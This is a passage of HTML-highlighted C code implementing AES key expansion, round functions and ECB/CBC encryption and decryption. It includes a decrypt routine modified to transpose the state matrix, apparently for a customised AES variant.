class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">aes_sub_dword</span><span class="params">(<span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> tmp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">0</span>;</span><br><span class="line">	tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">	tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">	tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">aes_rot_dword</span><span class="params">(<span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> tmp = val;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (val &gt;&gt; <span class="number">8</span>) | ((tmp &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">aes_swap_dword</span><span class="params">(<span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> (((val &amp; <span class="number">0x000000FF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">		((val &amp; <span class="number">0x0000FF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">		((val &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">8</span>) |</span><br><span class="line">		((val &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* nr: number of rounds</span></span><br><span class="line"><span class="comment">* nb: number of columns comprising the state, nb = 4 dwords (16 bytes)</span></span><br><span class="line"><span class="comment">* nk: number of 32-bit words comprising cipher key, nk = 4, 6, 8 (KeyLength/(4*8))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_key_expansion</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *round)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> *w = (<span class="type">uint32_t</span> *)round;</span><br><span class="line">	<span class="type">uint32_t</span>  t;</span><br><span class="line">	<span class="type">int</span>      i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		w[i] = *((<span class="type">uint32_t</span> *)&amp;key[i * <span class="number">4</span> + <span class="number">0</span>]);</span><br><span class="line">	&#125; <span class="keyword">while</span> (++i &lt; g_aes_nk[mode]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ((i % g_aes_nk[mode]) == <span class="number">0</span>) &#123;</span><br><span class="line">			t = aes_rot_dword(w[i - <span class="number">1</span>]);</span><br><span class="line">			t = aes_sub_dword(t);</span><br><span class="line">			t = t ^ aes_swap_dword(g_aes_rcon[i / g_aes_nk[mode] - <span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (g_aes_nk[mode] &gt; <span class="number">6</span> &amp;&amp; (i % g_aes_nk[mode]) == <span class="number">4</span>) &#123;</span><br><span class="line">			t = aes_sub_dword(w[i - <span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			t = w[i - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		w[i] = w[i - g_aes_nk[mode]] ^ t;</span><br><span class="line">	&#125; <span class="keyword">while</span> (++i &lt; g_aes_nb[mode] * (g_aes_rounds[mode] + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_add_round_key</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state,</span></span><br><span class="line"><span class="params">	<span class="type">uint8_t</span> *round, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> *w = (<span class="type">uint32_t</span> *)round;</span><br><span class="line">	<span class="type">uint32_t</span> *s = (<span class="type">uint32_t</span> *)state;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">		s[i] ^= w[nr * g_aes_nb[mode] + i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_sub_bytes</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">			state[i * <span class="number">4</span> + j] = aes_sub_sbox(state[i * <span class="number">4</span> + j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_shift_rows</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> *s = (<span class="type">uint8_t</span> *)state;</span><br><span class="line">	<span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">			<span class="type">uint8_t</span> tmp = s[i];</span><br><span class="line">			<span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; g_aes_nb[mode]; r++) &#123;</span><br><span class="line">				s[i + r * <span class="number">4</span>] = s[i + (r + <span class="number">1</span>) * <span class="number">4</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			s[i + (g_aes_nb[mode] - <span class="number">1</span>) * <span class="number">4</span>] = tmp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_xtime</span><span class="params">(<span class="type">uint8_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ (((x &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) * <span class="number">0x1b</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_xtimes</span><span class="params">(<span class="type">uint8_t</span> x, <span class="type">int</span> ts)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span> (ts-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		x = aes_xtime(x);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_mul</span><span class="params">(<span class="type">uint8_t</span> x, <span class="type">uint8_t</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	* encrypt: y has only 2 bits: can be 1, 2 or 3</span></span><br><span class="line"><span class="comment">	* decrypt: y could be any value of 9, b, d, or e</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ((((y &gt;&gt; <span class="number">0</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">0</span>)) ^</span><br><span class="line">		(((y &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">1</span>)) ^</span><br><span class="line">		(((y &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">2</span>)) ^</span><br><span class="line">		(((y &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">3</span>)) ^</span><br><span class="line">		(((y &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">4</span>)) ^</span><br><span class="line">		(((y &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">5</span>)) ^</span><br><span class="line">		(((y &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">6</span>)) ^</span><br><span class="line">		(((y &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">7</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_mix_columns</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> y[<span class="number">16</span>] = &#123; <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>,  <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>,  <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,  <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span> &#125;;</span><br><span class="line">	<span class="type">uint8_t</span> s[<span class="number">4</span>];</span><br><span class="line">	<span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">			s[r] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">				s[r] = s[r] ^ aes_mul(state[i * <span class="number">4</span> + j], y[r * <span class="number">4</span> + j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">			state[i * <span class="number">4</span> + r] = s[r];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_encrypt</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">	<span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* key expansion */</span></span><br><span class="line">	aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* init state from user buffer (plaintext) */</span></span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">			s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">		<span class="keyword">for</span> (nr = <span class="number">0</span>; nr &lt;= g_aes_rounds[mode]; nr++) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do SubBytes */</span></span><br><span class="line">				aes_sub_bytes(mode, s);</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do ShiftRows */</span></span><br><span class="line">				aes_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">					<span class="comment">/* do MixColumns */</span></span><br><span class="line">					aes_mix_columns(mode, s);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* do AddRoundKey */</span></span><br><span class="line">			aes_add_round_key(mode, s, w, nr);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">			data[i + j] = s[j];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_encrypt_ecb</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> aes_encrypt(mode, data, len, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_encrypt_cbc</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">	<span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line">	<span class="type">uint8_t</span> v[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* iv */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* key expansion */</span></span><br><span class="line">	aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(v, iv, <span class="keyword">sizeof</span>(v));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* init state from user buffer (plaintext) */</span></span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">			s[j] = data[i + j] ^ v[j];</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">		<span class="keyword">for</span> (nr = <span class="number">0</span>; nr &lt;= g_aes_rounds[mode]; nr++) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do SubBytes */</span></span><br><span class="line">				aes_sub_bytes(mode, s);</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do ShiftRows */</span></span><br><span class="line">				aes_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">					<span class="comment">/* do MixColumns */</span></span><br><span class="line">					aes_mix_columns(mode, s);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* do AddRoundKey */</span></span><br><span class="line">			aes_add_round_key(mode, s, w, nr);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">			data[i + j] = v[j] = s[j];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">inv_shift_rows</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> *s = (<span class="type">uint8_t</span> *)state;</span><br><span class="line">	<span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; g_aes_nb[mode] - i; j++) &#123;</span><br><span class="line">			<span class="type">uint8_t</span> tmp = s[i];</span><br><span class="line">			<span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; g_aes_nb[mode]; r++) &#123;</span><br><span class="line">				s[i + r * <span class="number">4</span>] = s[i + (r + <span class="number">1</span>) * <span class="number">4</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			s[i + (g_aes_nb[mode] - <span class="number">1</span>) * <span class="number">4</span>] = tmp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">inv_sub_sbox</span><span class="params">(<span class="type">uint8_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_inv_sbox[val];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">inv_sub_bytes</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">			state[i * <span class="number">4</span> + j] = inv_sub_sbox(state[i * <span class="number">4</span> + j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">inv_mix_columns</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> y[<span class="number">16</span>] = &#123; <span class="number">0x0e</span>, <span class="number">0x0b</span>, <span class="number">0x0d</span>, <span class="number">0x09</span>,  <span class="number">0x09</span>, <span class="number">0x0e</span>, <span class="number">0x0b</span>, <span class="number">0x0d</span>,</span><br><span class="line">		<span class="number">0x0d</span>, <span class="number">0x09</span>, <span class="number">0x0e</span>, <span class="number">0x0b</span>,  <span class="number">0x0b</span>, <span class="number">0x0d</span>, <span class="number">0x09</span>, <span class="number">0x0e</span> &#125;;</span><br><span class="line">	<span class="type">uint8_t</span> s[<span class="number">4</span>];</span><br><span class="line">	<span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">			s[r] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">				s[r] = s[r] ^ aes_mul(state[i * <span class="number">4</span> + j], y[r * <span class="number">4</span> + j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">			state[i * <span class="number">4</span> + r] = s[r];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_decrypt</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">	<span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> nr, i, j;</span><br><span class="line">    <span class="comment">//魔改</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"> 		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			s[i+j*<span class="number">4</span>]=data[i*<span class="number">4</span>+j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* key expansion */</span></span><br><span class="line">	aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* init state from user buffer (cyphertext) */</span></span><br><span class="line">		<span class="comment">//for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)</span></span><br><span class="line">			<span class="comment">//s[j] = data[i + j];</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">		<span class="keyword">for</span> (nr = g_aes_rounds[mode]; nr &gt;= <span class="number">0</span>; nr--) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* do AddRoundKey */</span></span><br><span class="line">			aes_add_round_key(mode, s, w, nr);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">					<span class="comment">/* do MixColumns */</span></span><br><span class="line">					inv_mix_columns(mode, s);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do ShiftRows */</span></span><br><span class="line">				inv_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do SubBytes */</span></span><br><span class="line">				inv_sub_bytes(mode, s);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">		<span class="comment">//for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)</span></span><br><span class="line">			<span class="comment">//data[i + j] = s[j];</span></span><br><span class="line">     <span class="comment">//魔改</span></span><br><span class="line">	 <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			data[i*<span class="number">4</span>+j]=s[i+j*<span class="number">4</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_decrypt_ecb</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> aes_decrypt(mode, data, len, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_decrypt_cbc</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">	<span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line">	<span class="type">uint8_t</span> v[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* iv */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* key expansion */</span></span><br><span class="line">	aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(v, iv, <span class="keyword">sizeof</span>(v));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* init state from user buffer (cyphertext) */</span></span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">			s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">		<span class="keyword">for</span> (nr = g_aes_rounds[mode]; nr &gt;= <span class="number">0</span>; nr--) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* do AddRoundKey */</span></span><br><span class="line">			aes_add_round_key(mode, s, w, nr);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">					<span class="comment">/* do MixColumns */</span></span><br><span class="line">					inv_mix_columns(mode, s);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do ShiftRows */</span></span><br><span class="line">				inv_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* do SubBytes */</span></span><br><span class="line">				inv_sub_bytes(mode, s);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++) &#123;</span><br><span class="line">			<span class="type">uint8_t</span> p = s[j] ^ v[j];</span><br><span class="line">			v[j] = data[i + j];</span><br><span class="line">			data[i + j] = p;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span 